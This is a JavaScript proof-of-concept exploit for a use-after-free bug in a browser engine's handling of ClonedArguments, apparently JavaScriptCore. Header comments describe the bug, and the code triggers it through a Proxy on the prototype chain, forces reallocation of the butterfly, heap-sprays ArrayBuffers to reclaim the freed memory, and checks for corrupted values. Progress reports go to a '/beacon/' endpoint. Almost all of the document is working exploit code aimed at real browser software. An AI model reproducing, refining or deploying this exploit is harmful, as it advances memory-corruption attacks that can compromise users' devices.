// p220 — ClonedArguments butterfly UAF
//
// Bug: ClonedArguments::copyToArguments (ClonedArguments.cpp:326)
// caches butterfly.contiguous().data() as raw pointer, then on a
// hole calls get() which walks the prototype chain. If a Proxy is
// on the prototype, arbitrary JS runs. That JS can grow the
// ClonedArguments (reallocate butterfly), freeing the old one.
// Next loop iteration reads from the stale cached pointer.
//
// Trigger: func.apply(null, arguments) on sloppy-mode function
// with holes in arguments and Proxy on prototype chain.
//
// No JIT required. Works through LLInt op_call_varargs → loadVarargs.
//
// Beacon prefix: V220-

(function() {
  function B(tag, body) {
    var url = '/beacon/V220-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  // ---- Phase 1: Verify basic trigger ----
  // Create a sloppy-mode function that spreads arguments
  function target() { return arguments; }

  function receiver() {
    return Array.prototype.slice.call(arguments);
  }

  function triggerCopy(args) {
    // func.apply triggers loadVarargs → ClonedArguments::copyToArguments
    return receiver.apply(null, args);
  }

  // Test 1: basic ClonedArguments creation
  try {
    var args = target(1, 2, 3, 4, 5, 6, 7, 8);
    B('ARGS-OK-LEN-' + args.length);

    // Verify it's contiguous indexing
    var result = triggerCopy(args);
    B('COPY-OK-' + result.join(','));
  } catch (e) {
    B('BASIC-ERR-' + e.message.substring(0, 40));
  }

  // ---- Phase 2: Test hole creation ----
  try {
    var args2 = target(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);
    delete args2[3]; // Create hole at index 3
    B('HOLE-CREATED');

    // Without proxy: get() falls through to Object.prototype
    var result2 = triggerCopy(args2);
    B('HOLE-COPY-' + result2.length);
    // args2[3] should be undefined (from prototype lookup)
    B('HOLE-VAL-' + (result2[3] === undefined ? 'undef' : result2[3]));
  } catch (e) {
    B('HOLE-ERR-' + e.message.substring(0, 40));
  }

  // ---- Phase 3: Test Proxy on prototype chain ----
  var proxyCallCount = 0;
  try {
    var args3 = target(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);
    delete args3[3]; // Hole at index 3

    var handler = {
      get: function(target, prop, receiver) {
        proxyCallCount++;
        B('PROXY-GET-' + prop + '-N' + proxyCallCount);
        return undefined;
      }
    };

    var proxy = new Proxy({}, handler);
    Object.setPrototypeOf(args3, proxy);
    B('PROTO-SET');

    var result3 = triggerCopy(args3);
    B('PROXY-COPY-OK-' + result3.length + '-CALLS-' + proxyCallCount);
  } catch (e) {
    B('PROXY-ERR-' + e.message.substring(0, 40));
  }

  // ---- Phase 4: Trigger butterfly reallocation in Proxy trap ----
  var reallocHappened = false;
  var reallocCount = 0;
  try {
    // Need enough arguments so butterfly is contiguous
    var args4 = target(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16);
    delete args4[3]; // Hole at index 3

    var trap = {
      get: function(target, prop, receiver) {
        reallocCount++;
        if (reallocCount <= 1) {
          B('TRAP-FIRE-' + prop);
          // Grow the arguments object to force butterfly reallocation
          for (var j = 100; j < 500; j++) {
            args4[j] = 0x42424242;
          }
          reallocHappened = true;
          B('TRAP-GREW-TO-500');
        }
        return 0xDEADDEAD;
      }
    };

    var proxyProto = new Proxy({}, trap);
    Object.setPrototypeOf(args4, proxyProto);
    B('REALLOC-PROTO-SET');

    // Spray to reclaim the freed butterfly
    // Old butterfly was ~16 * 8 = 128 bytes
    // Spray 128-byte objects to fill the freed slot
    var sprayBufs = [];
    var sprayViews = [];
    var SPRAY_SIZE = 128;
    var SPRAY_COUNT = 2000;

    // Pre-create spray (will be allocated after butterfly is freed)
    // Actually we need to spray DURING the Proxy trap, not before

    // Better approach: spray inside the trap
    var trapSprayBufs = [];
    var trapSprayViews = [];

    var trap2 = {
      get: function(target, prop, receiver) {
        reallocCount++;
        if (reallocCount <= 1) {
          B('TRAP2-FIRE-' + prop);

          // Force butterfly reallocation by growing
          for (var j = 100; j < 500; j++) {
            args4[j] = 0x41414141;
          }
          B('TRAP2-GREW');

          // Flush bmalloc dealloc log: free 120+ small objects
          // This pushes the old butterfly out of the log into the free list
          var flushJunk = [];
          for (var f = 0; f < 150; f++) flushJunk.push(new ArrayBuffer(64));
          flushJunk = null; // free them all

          // Now spray to reclaim the OLD butterfly
          // Old butterfly: IndexingHeader(8) + 16*8(data) = 136 bytes
          // Try multiple sizes around the bmalloc size class
          for (var s = 0; s < SPRAY_COUNT; s++) {
            var ab = new ArrayBuffer(144);
            var view = new Uint32Array(ab);
            // Fill with JSValue-encoded int32s (NumberTag | marker)
            // JSValue int32 on 64-bit: 0xFFFE0000_XXXX_XXXX
            // Low 32 = marker, High 32 = 0xFFFE0000
            for (var k = 0; k < view.length; k += 2) {
              view[k] = 0xC0FE0000 | (s & 0xFFFF);     // low 32: marker
              view[k + 1] = 0xFFFE0000;                  // high 32: NumberTag
            }
            trapSprayBufs.push(ab);
            trapSprayViews.push(view);
          }
          B('TRAP2-SPRAYED-' + SPRAY_COUNT);
        }
        return 0xBEEF0000 | (reallocCount & 0xFFFF);
      }
    };

    var proxyProto2 = new Proxy({}, trap2);
    reallocCount = 0;

    // Fresh arguments for clean test
    var args5 = target(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16);
    delete args5[3]; // Hole at index 3
    Object.setPrototypeOf(args5, proxyProto2);
    B('UAF-SETUP-DONE');

    // This triggers the UAF:
    // 1. copyToArguments caches butterfly data pointer
    // 2. Hits hole at index 3 → get() → Proxy trap fires
    // 3. Trap grows args5 (butterfly reallocated) and sprays over freed memory
    // 4. Loop resumes with stale pointer → reads from spray data
    var result5;
    try {
      result5 = receiver.apply(null, args5);
    } catch (e) {
      B('UAF-APPLY-ERR-' + e.message.substring(0, 40));
      result5 = null;
    }

    if (result5) {
      B('UAF-RESULT-LEN-' + result5.length);

      // Check entries 4+ — these should read from the stale (freed) butterfly
      // If spray reclaimed, we see 0xC0FE#### (as JS integers ~3.237B range)
      // JSValue int32 0xFFFE0000_C0FE_XXXX → JS number = 0xC0FE0000 | spray_id
      var corruptCount = 0;
      var corruptVals = [];
      for (var r = 0; r < Math.min(result5.length, 20); r++) {
        var v = result5[r];
        var vStr;
        if (typeof v === 'number') {
          var u = v >>> 0; // to uint32
          vStr = hex(u);
          // Check for our spray marker: 0xC0FExxxx or 0xBEEFxxxx
          if ((u >>> 16) === 0xC0FE || (u >>> 16) === 0xBEEF) {
            corruptCount++;
          } else if (v !== (r + 1) && r < 16 && r !== 3) {
            // Not original value and not the hole
            corruptCount++;
            vStr = 'DIFF:' + hex(u);
          }
        } else if (typeof v === 'object' && v !== null) {
          vStr = 'obj';
          corruptCount++;
        } else if (v === undefined) {
          vStr = 'undef';
        } else {
          vStr = typeof v + ':' + String(v).substring(0, 10);
        }
        corruptVals.push(r + '=' + vStr);
      }
      B('UAF-VALS', corruptVals.join(' '));
      B('UAF-CORRUPT-' + corruptCount);

      if (corruptCount > 0) {
        B('UAF-CONFIRMED');
      } else {
        B('UAF-NO-CORRUPT-CHECK-TIMING');
      }
    }

    // Also check: did we get values from spray in any argument?
    // The stale pointer should read spray pattern (0xCAFE####)
    B('TRAP-SPRAY-COUNT-' + trapSprayBufs.length);
  } catch (e) {
    B('REALLOC-ERR-' + e.message.substring(0, 60));
  }

  // ---- Phase 5: Alternative trigger — larger butterfly, more precise spray ----
  try {
    B('ALT-START');
    reallocCount = 0;

    // Use more arguments so butterfly is larger
    var manyArgs = [];
    for (var a = 0; a < 64; a++) manyArgs.push(a + 1);

    var args6 = target.apply(null, manyArgs);
    // Delete multiple holes to increase chance of hitting get()
    delete args6[5];
    delete args6[10];
    delete args6[15];
    delete args6[20];
    B('ALT-HOLES-CREATED');

    var altSpray = [];
    var altViews = [];

    var altTrap = {
      get: function(target, prop, receiver) {
        reallocCount++;
        if (reallocCount === 1) {
          B('ALT-TRAP-' + prop);
          // Grow butterfly
          for (var j = 100; j < 1000; j++) {
            args6[j] = 0x43434343;
          }

          // Flush dealloc log
          var fj = [];
          for (var f = 0; f < 150; f++) fj.push(new ArrayBuffer(64));
          fj = null;

          // Old butterfly: IndexingHeader(8) + 64*8 = 520 bytes
          // Spray matching-size buffers
          for (var s = 0; s < 3000; s++) {
            var ab = new ArrayBuffer(528);
            var v = new Uint32Array(ab);
            // Fill with JSValue-encoded int32s (NumberTag | marker)
            for (var k = 0; k < v.length; k += 2) {
              v[k] = 0xD0AD0000 | (s & 0xFFFF);     // low 32: marker
              v[k + 1] = 0xFFFE0000;                  // high 32: NumberTag
            }
            altSpray.push(ab);
            altViews.push(v);
          }
          B('ALT-SPRAYED-' + altSpray.length);
        }
        return 0xFACE0000 | (reallocCount & 0xFFFF);
      }
    };

    Object.setPrototypeOf(args6, new Proxy({}, altTrap));
    B('ALT-PROTO-SET');

    var result6;
    try {
      result6 = receiver.apply(null, args6);
    } catch (e) {
      B('ALT-APPLY-ERR-' + e.message.substring(0, 40));
      result6 = null;
    }

    if (result6) {
      B('ALT-RESULT-LEN-' + result6.length);
      var vals = [];
      var deadCount = 0;
      for (var r = 0; r < Math.min(result6.length, 64); r++) {
        var v = result6[r];
        if (typeof v === 'number') {
          var u = v >>> 0;
          // Check for our spray marker 0xD0ADxxxx or 0xFACExxxx
          if ((u >>> 16) === 0xD0AD || (u >>> 16) === 0xFACE) {
            deadCount++;
            vals.push(r + '=' + hex(u));
          } else if (r >= 6 && r < 64 && v !== (r + 1)) {
            // After hole indices, value differs from original
            deadCount++;
            vals.push(r + '=DIFF:' + hex(u));
          }
        } else if (typeof v === 'object' && v !== null) {
          deadCount++;
          vals.push(r + '=OBJ');
        }
      }
      B('ALT-DEAD-' + deadCount);
      if (vals.length > 0) B('ALT-VALS', vals.join(' '));
      if (deadCount > 0) B('ALT-UAF-CONFIRMED');
    }
  } catch (e) {
    B('ALT-ERR-' + e.message.substring(0, 60));
  }

  B('DONE');
})();
